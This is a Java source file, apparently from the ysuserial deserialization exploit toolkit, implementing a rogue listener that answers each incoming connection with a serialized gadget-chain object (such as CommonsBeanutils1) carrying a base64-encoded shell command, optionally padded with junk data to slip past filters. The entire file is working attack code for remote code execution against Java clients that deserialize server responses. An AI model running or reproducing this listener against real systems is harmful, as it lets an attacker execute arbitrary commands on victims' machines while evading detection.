package org.su18.ysuserial.exploit;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.util.dirty.DirtyDataWrapper;

import java.io.*;

import java.lang.reflect.InvocationTargetException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;

import static org.su18.ysuserial.payloads.util.Utils.base64Decode;

/**
 * 后反序列化利用
 * 使用方法
 * SRIListener 8888 CommonsBeanutils1 T3BlbiAtYSBDYWxjdWxhdG9yLmFwcA== 10000
 * <p>
 * 注意中间的命令进行 base64
 *
 * @author su18
 */
public class SRIListener {

	private static void invoke(final Socket socket, final String[] args) throws IOException {
		System.out.println(args);
		new Thread(new Runnable() {
			public void run() {
				ObjectInputStream  is = null;
				ObjectOutputStream os = null;
				try {
					is = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
					os = new ObjectOutputStream(socket.getOutputStream());

					final String payloadType = args[0];
					String       command     = args[1];

					// 支持单双引号
					if (command.startsWith("'") || command.startsWith("\"")) {
						command = command.substring(1, command.length() - 1);
					}

					String realCmd = base64Decode(command);
					System.out.println(realCmd);

					final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
					ObjectPayload                        payload      = payloadClass.newInstance();
					Object                               object       = payload.getObject(realCmd);

					if (args.length >= 3) {
						final String length = args[2];
						object = (new DirtyDataWrapper(object, Integer.parseInt(length))).doWrap();
					}

					os.writeObject(object);
					os.flush();
				} catch (IOException ex) {
				} catch (ClassNotFoundException ex) {
				} catch (NoSuchMethodException e) {
					e.printStackTrace();
				} catch (InstantiationException e) {
					e.printStackTrace();
				} catch (IllegalAccessException e) {
					e.printStackTrace();
				} catch (InvocationTargetException e) {
					e.printStackTrace();
				} catch (NoSuchFieldException e) {
					e.printStackTrace();
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					try {
						// Sleep 一下等待流读完
						Thread.sleep(10000);
						is.close();
					} catch (Exception ex) {
					}
					try {
						os.close();
					} catch (Exception ex) {
					}
					try {
						socket.close();
					} catch (Exception ex) {
					}
				}
			}
		}).start();
	}


	public static void main(String[] args) {

		String port = args[0];

		try {
			ServerSocket server = new ServerSocket(Integer.parseInt(port));
			while (true) {
				Socket socket = server.accept();
				invoke(socket, Arrays.copyOfRange(args, 1, args.length));
			}
		} catch (IOException e) {


		}
	}

}
